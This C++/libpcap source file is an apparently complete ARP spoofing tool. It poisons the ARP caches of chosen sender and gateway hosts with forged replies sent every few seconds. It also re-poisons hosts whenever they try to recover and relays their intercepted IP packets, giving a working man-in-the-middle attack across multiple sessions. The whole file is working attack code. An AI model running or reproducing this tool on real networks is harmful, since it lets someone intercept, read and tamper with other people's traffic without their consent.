#include <iostream>
#include <pcap.h>
#include <iomanip>
#include <thread>
#include "param.h"
#include <unistd.h>
#include "printdata.h"
#include <signal.h>
#include <future>
#include <glog/logging.h>
#include <gflags/gflags.h>

using namespace std;

#define PROMISCUOUS 1
#define NONPROMISCUOUS 0

void parseClass(Param* param, char *argv[], int sessionNum);
void initClass(Param* param, char* device, int sessionNum);
int findARPReply(pcap_t* pcd, Mac* retnMAC, uint32_t* find_IP, uint32_t* my_IP);
void getSenderMAC(pcap_t *pcd,Param* param,int sessionNum);
void getTargetMAC(pcap_t *pcd,Param* param,int sessionNum);
void sendARPReguest(Param param,uint32_t*findIP,int print,pcap_t *pcd);
void sendInfectionPacket(pcap_t* pcd,Param param);
void callSendInfectionPacket(pcap_t* pcd, Param *param, int sessionNum);
void signalFunction(int sig);
void modifySignalHandler(bool* signalHandler);
void relayAntiRecover(pcap_t* pcd, Param *param, int sessionNum);
void sendRelayPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC,const u_char* originPacket);

bool pHandler=true;

struct ARPPacket{
    struct ether_header eh;
    struct ether_arp arp;
};


int main(int argc, char *argv[])
{
    google::InitGoogleLogging(argv[0]); //need to add -lglog
    FLAGS_alsologtostderr=1;           //log print to console

    ProtoParam protoParam(argc,argv); //check arg & init sessionNum

    char errBuf[PCAP_ERRBUF_SIZE];
    char* device = pcap_lookupdev(errBuf); //get device
    signal(SIGINT,signalFunction); //if input ctrl + c or kill process call signalFunction

    Param param[protoParam.sessionNum]; //make class

    parseClass(param,argv,protoParam.sessionNum);
    initClass(param,device,protoParam.sessionNum);
    /*init pcd*/
    pcap_t *pcd;
    if((pcd = pcap_open_live(device,BUFSIZ,PROMISCUOUS,1,errBuf))==NULL)
    {
        perror(errBuf);
        exit(1);
    }
    /*init pcd*/


    cout<<"Processing..."<<endl;
    getSenderMAC(pcd,param,protoParam.sessionNum);
    getTargetMAC(pcd,param,protoParam.sessionNum);

    for (int i = 0; i < protoParam.sessionNum; ++i) {
        cout<<"Session "<<i+1<<" Info"<<endl;
        printLine();
        param[i].printInfo();
    }

    Param threadparam[protoParam.sessionNum];

    memcpy(threadparam,param,sizeof(threadparam));\
    thread t1(callSendInfectionPacket,pcd,&*threadparam,protoParam.sessionNum);

    relayAntiRecover(pcd,param,protoParam.sessionNum);


     t1.join();

}

void parseClass(Param* param,char* argv[],int sessionNum)
{
    for (int i = 0; i < sessionNum; i++)
        param[i].parse(argv,i); //value into var

}

void initClass(Param *param, char *device,int sessionNum)
{
    for (int i = 0; i < sessionNum; i++)
        param[i].initParam(device);
}

int findARPReply(pcap_t* pcd,Mac* retnMAC,uint32_t* find_IP,uint32_t* my_IP)
{

    const u_char *pkt_data;
    struct pcap_pkthdr *pktHeader;
    int valueOfNextEx;

    while(true)
    {

        //need a thread
        valueOfNextEx=pcap_next_ex(pcd,&pktHeader,&pkt_data);

        switch (valueOfNextEx)
        {
            case 1:
                   struct ARPPacket *arp;
                   arp=(struct ARPPacket*)pkt_data;
                   if(ntohs(arp->eh.ether_type)==ETHERTYPE_ARP)
                   {
                       Ip spa;
                       Ip tpa;
                       spa=arp->arp.arp_spa;
                       tpa=arp->arp.arp_tpa;
                       if(spa==find_IP)
                           if(tpa==my_IP)
                           {
                               *retnMAC=arp->eh.ether_shost;
                               return 0;
                           }

                   }

                break;
            case 0:
                cout<<"need a sec.. to packet capture"<<endl;
                continue;
            case -1:
                perror("pcap_next_ex function has an error!!");
                exit(1);

            case -2:
                cout<<"the packet have reached EOF!!"<<endl;
                exit(0);
            default:
                break;
            }
    }
}

void getSenderMAC(pcap_t *pcd,Param* param,int sessionNum)
{

    for (int i = 0; i < sessionNum; ++i) {
        thread t1(findARPReply,pcd,&param[i].sender_Mac,param[i].sender_Ip.retnIP(),param[i].my_Ip.retnIP());
        sleep(1);
        thread t2(sendARPReguest,param[i],param[i].sender_Ip.retnIP(),0,pcd);
        t1.join();
        t2.join();
    }

}
void getTargetMAC(pcap_t *pcd,Param* param,int sessionNum)
{

    for (int i = 0; i < sessionNum; ++i) {
        thread t1(findARPReply,pcd,&param[i].target_Mac,param[i].target_Ip.retnIP(),param[i].my_Ip.retnIP());
        sleep(1);
        thread t2(sendARPReguest,param[i],param[i].target_Ip.retnIP(),0,pcd);
        t1.join();
        t2.join();
    }

}




void sendARPReguest(Param param, uint32_t *findIP, int print, pcap_t *pcd)
{
    struct ARPPacket ARPRequest;

    u_int8_t broadcast[]={0xff,0xff,0xff,0xff,0xff,0xff};

    //init ETHER_HEADER
    memcpy(ARPRequest.eh.ether_dhost,broadcast,ETHER_ADDR_LEN); //set destination address to broadcast
    memcpy(ARPRequest.eh.ether_shost,param.my_Mac.retnMac(),ETHER_ADDR_LEN); //set source address to myMAC
    ARPRequest.eh.ether_type=htons(ETH_P_ARP);

    //init ARP_HEADER
    ARPRequest.arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
    ARPRequest.arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
    ARPRequest.arp.ea_hdr.ar_hln=6;                    //set Hardware Size 6 -> MAC address size
    ARPRequest.arp.ea_hdr.ar_pln=4;                    //set Protocol length 4 -> 4 IP address size
    ARPRequest.arp.ea_hdr.ar_op=ntohs(1);              //set opcode 1(request)

    u_int8_t ARPTargetMAC[ETHER_ADDR_LEN]={0x00,0x00,0x00,0x00,0x00,0x00};


    memcpy(ARPRequest.arp.arp_sha,param.my_Mac.retnMac(),sizeof(ARPRequest.arp.arp_sha));  //set Source Address to my_MAC
    memcpy(ARPRequest.arp.arp_spa,param.my_Ip.retnIP(),sizeof(ARPRequest.arp.arp_spa));
    memcpy(ARPRequest.arp.arp_tha,ARPTargetMAC,sizeof(ARPRequest.arp.arp_tha));
    memcpy(ARPRequest.arp.arp_tpa,findIP,sizeof(ARPRequest.arp.arp_tpa));


    if(print)
    {
         cout<<"Send ARP Request Packet !!"<<endl;
         cout<<"Send Arp Packet Data "<<endl;
         printByHexData((u_int8_t*)&ARPRequest,sizeof(struct ARPPacket));
    }


     pcap_sendpacket(pcd,(u_int8_t*)&ARPRequest,sizeof(ARPPacket));

}

void sendInfectionPacket(pcap_t* pcd,Param param)
{
    struct ARPPacket ARPInfection;

    memcpy(ARPInfection.eh.ether_dhost,param.sender_Mac.retnMac(),ETHER_ADDR_LEN); //destnation mac is sender mac
    memcpy(ARPInfection.eh.ether_shost,param.my_Mac.retnMac(),ETHER_ADDR_LEN); //source mac is my mac
    ARPInfection.eh.ether_type=htons(ETHERTYPE_ARP); //define next protocol


    ARPInfection.arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
    ARPInfection.arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
    ARPInfection.arp.ea_hdr.ar_hln=6;             //set Hardware Size 6 -> MAC address size
    ARPInfection.arp.ea_hdr.ar_pln=4;             //set Protocol length 4 -> 4 IP address size
    ARPInfection.arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)


    memcpy(ARPInfection.arp.arp_sha,param.my_Mac.retnMac(),ETHER_ADDR_LEN);  //set Source Address to My MAC
    memcpy(ARPInfection.arp.arp_spa,param.target_Ip.retnIP(),IP_ADDR_LEN);       //set Source Protocol Address to Target IP
    memcpy(ARPInfection.arp.arp_tha,param.sender_Mac.retnMac(),ETHER_ADDR_LEN);              //set Target Hardware Address to Sender MAC
    memcpy(ARPInfection.arp.arp_tpa,param.sender_Ip.retnIP(),IP_ADDR_LEN);    //set Target Protocol Address to Sender IP


    pcap_sendpacket(pcd,(uint8_t*)&ARPInfection,sizeof(ARPInfection));

}

void callSendInfectionPacket(pcap_t *pcd, Param* param, int sessionNum)
{


    while(pHandler)
    {
        for (int i = 0; i < sessionNum; ++i) {
            sendInfectionPacket(pcd,param[i]);

        }
        sleep(3);
    }
    DLOG(INFO)<<"sendInfectionPacket thread killed"<<endl;
}

void signalFunction(int sig)
{
    (void)sig;
    pHandler=false;
    DLOG(INFO)<<"signal Function called"<<endl;
    signal(SIGINT,SIG_DFL);
}

void relayAntiRecover(pcap_t *pcd, Param *param,int sessionNum)
{
    const u_char *pkt_data;
    struct pcap_pkthdr *pktHeader;
    int valueOfNextEx;

    while(pHandler)
    {

        //need a thread
        valueOfNextEx=pcap_next_ex(pcd,&pktHeader,&pkt_data);

        switch (valueOfNextEx)
        {
            case 1:
                {
                    //do anti recover
                    struct ether_header *ep =(struct ether_header*)pkt_data;
                    u_int16_t ether_type =ntohs(ep->ether_type);

                    if(ether_type==ETHERTYPE_ARP) //next packet ARP
                    {
                        struct ARPPacket* ARPRecover=(struct ARPPacket *)pkt_data;
                        for (int i = 0; i < sessionNum; i++)
                        {

                            //senderPC -> gateway
                            if(param[i].sender_Mac==ARPRecover->arp.arp_sha)
                                if(param[i].sender_Ip==ARPRecover->arp.arp_spa) //recover about senderIP
                                    sendInfectionPacket(pcd,param[i]);


                            //gateway -> senderPC

                            if(param[i].target_Mac==ARPRecover->arp.arp_sha)
                                if(param[i].target_Ip==ARPRecover->arp.arp_spa) //recover about targetIP
                                    sendInfectionPacket(pcd,param[i]);

                        }
                    }

                    //do relay

                    if(ether_type==ETHERTYPE_IP)
                    {
                        struct iphdr *iph=(struct iphdr*)(pkt_data+sizeof(struct ether_header));

                        for (int i = 0; i < sessionNum; i++)
                        {
                            if(param[i].sender_Mac==ep->ether_shost) //if src MAC is senderMAC
                                if(param[i].my_Mac==ep->ether_dhost) //if dest MAC is myMAC
                                     if(param[i].sender_Ip==&iph->saddr)//if src IP address Sender
                                         sendRelayPacket(pcd,pktHeader->len,param[i].my_Mac.retnMac(),param[i].target_Mac.retnMac(),pkt_data); //change src mac addr to target mac & send


                        }
                    }
                 break;
                }
            case 0:
                cout<<"need a sec.. to packet capture"<<endl;
                continue;
            case -1:
                perror("pcap_next_ex function has an error!!");
                exit(1);

            case -2:
                cout<<"the packet have reached EOF!!"<<endl;
                exit(0);
            default:
                break;
            }
    }

}



void sendRelayPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC,const u_char* originPacket)
{

    u_char mPacket[len];
    memcpy(mPacket,originPacket,len);
    struct ether_header* ep=(struct ether_header*)mPacket;
    memcpy(ep->ether_shost,mSrcMAC,ETHER_ADDR_LEN); //change sender MAC
    memcpy(ep->ether_dhost,mDestMAC,ETHER_ADDR_LEN); //change Destination MAC
    pcap_sendpacket(pcd,mPacket,len);
}
